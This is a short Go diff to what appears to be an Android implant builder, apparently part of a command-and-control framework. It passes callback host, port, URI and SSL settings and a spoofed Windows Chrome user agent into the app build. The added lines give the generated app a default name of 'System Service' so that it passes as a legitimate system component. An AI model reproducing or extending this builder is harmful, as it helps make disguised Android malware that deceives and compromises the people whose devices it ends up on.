@@ -147,12 +147,17 @@ func (ab *AndroidBuilder) Build() bool {
 	if ua == "" {
 		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
 	}
+	label := ab.AppLabel
+	if label == "" {
+		label = "System Service"
+	}
 	props := []string{
 		fmt.Sprintf("-PCONFIG_HOST=%s", ab.Host),
 		fmt.Sprintf("-PCONFIG_PORT=%d", ab.Port),
 		fmt.Sprintf("-PCONFIG_URI=%s", ab.Uri),
 		fmt.Sprintf("-PCONFIG_SSL=%v", ab.Ssl),
 		fmt.Sprintf("-PCONFIG_PKG=%s", ab.PackageName),
+		fmt.Sprintf("-PCONFIG_LABEL=%s", label),
 		fmt.Sprintf("-PCONFIG_UA=%s", ua),
 	}
 
